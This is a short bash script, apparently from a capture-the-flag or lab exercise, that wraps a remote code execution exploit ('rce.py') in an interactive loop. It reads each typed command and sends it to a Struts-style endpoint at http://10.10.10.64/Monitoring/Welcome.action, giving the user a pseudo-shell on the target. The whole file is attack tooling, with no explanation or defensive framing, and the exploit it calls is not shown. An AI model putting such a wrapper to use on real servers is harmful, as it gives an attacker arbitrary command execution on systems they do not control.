#!/bin/bash
while true
do
	echo -n "> "
	read command
	python rce.py http://10.10.10.64/Monitoring/Welcome.action "$command"
done
